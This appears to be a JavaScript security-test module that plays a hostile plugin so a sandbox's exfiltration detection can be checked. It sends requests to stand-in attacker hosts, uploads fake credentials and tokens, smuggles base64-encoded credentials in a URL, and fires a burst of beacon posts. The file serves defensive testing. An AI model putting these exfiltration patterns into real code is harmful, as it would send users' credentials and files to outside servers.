// Malicious Test Module: data_exfiltration.js (T094)
//
// Purpose: Test data exfiltration detection
// Expected: Suspicious network patterns should be detected
//
// Security Test: SC-017 (Suspicious Behavior Detection)

/**
 * Malicious Module: Attempts data exfiltration
 *
 * Attempts:
 * 1. Rapid requests to multiple different domains
 * 2. Large data uploads to external servers
 * 3. Base64 encoded data in requests
 * 4. DNS tunneling patterns
 */
export class DataExfiltrationModule {
  constructor() {
    this.name = 'data-exfiltration-test';
  }

  canHandle(url) {
    return true;
  }

  async extractDownloadInfo(url, context) {
    context.log.info('[ATTACK] Starting data exfiltration attempts');

    // Attack 1: Request to multiple different domains
    try {
      context.log.warn('[ATTACK] Attempting rapid multi-domain requests (exfiltration pattern)');

      const domains = [
        'https://test.example.com/collect',
        'https://attacker1.com/data',
        'https://attacker2.com/data',
        'https://attacker3.com/data',
        'https://attacker4.com/data',
        'https://attacker5.com/data',
      ];

      const promises = domains.map(domain =>
        context.http.get(domain, {}).catch(err => ({ error: err.message }))
      );

      const results = await Promise.all(promises);
      const successful = results.filter(r => !r.error).length;

      if (successful > 2) {
        context.log.error(`[ATTACK] SUCCESS - Accessed ${successful} different domains! Exfiltration possible!`);
      } else {
        context.log.info(`[EXPECTED] Multi-domain access limited: ${successful} succeeded`);
      }
    } catch (error) {
      context.log.info(`[EXPECTED] Multi-domain detection: ${error.message}`);
    }

    // Attack 2: Try to upload large amount of data
    try {
      context.log.warn('[ATTACK] Attempting large data upload');

      // Simulate sensitive data
      const sensitiveData = JSON.stringify({
        credentials: Array(1000).fill({ username: 'user', password: 'secret' }),
        tokens: Array(1000).fill('secret-token-12345'),
        files: Array(1000).fill('sensitive-file-content'),
      });

      const response = await context.http.post(
        'https://test.example.com/collect',
        { 'Content-Type': 'application/json' },
        sensitiveData
      );

      context.log.error('[ATTACK] SUCCESS - Large data upload succeeded! Data exfiltration possible!');
    } catch (error) {
      context.log.info(`[EXPECTED] Large upload blocked: ${error.message}`);
    }

    // Attack 3: Base64 encoded suspicious data
    try {
      context.log.warn('[ATTACK] Attempting to exfiltrate base64-encoded credentials');

      const stolenData = Buffer.from(JSON.stringify({
        type: 'credentials',
        data: { username: 'admin', password: 'super-secret' }
      })).toString('base64');

      const response = await context.http.get(
        `https://test.example.com/track?data=${stolenData}`,
        {}
      );

      context.log.error('[ATTACK] SUCCESS - Exfiltrated encoded data! Security breach!');
    } catch (error) {
      context.log.info(`[EXPECTED] Encoded data transmission blocked: ${error.message}`);
    }

    // Attack 4: Abnormal request frequency pattern
    try {
      context.log.warn('[ATTACK] Attempting abnormal request burst (data leak pattern)');

      const promises = [];
      for (let i = 0; i < 50; i++) {
        promises.push(
          context.http.post(
            'https://test.example.com/beacon',
            {},
            JSON.stringify({ chunk: i, data: 'sensitive-chunk-' + i })
          ).catch(err => ({ error: err.message }))
        );
      }

      const results = await Promise.all(promises);
      const successful = results.filter(r => !r.error).length;

      if (successful === 50) {
        context.log.error('[ATTACK] SUCCESS - All burst requests succeeded! Abnormal pattern undetected!');
      } else {
        context.log.info(`[EXPECTED] Request burst limited: ${successful}/50 succeeded`);
      }
    } catch (error) {
      context.log.info(`[EXPECTED] Burst pattern detected: ${error.message}`);
    }

    throw new Error('Data exfiltration test completed');
  }
}

export default DataExfiltrationModule;
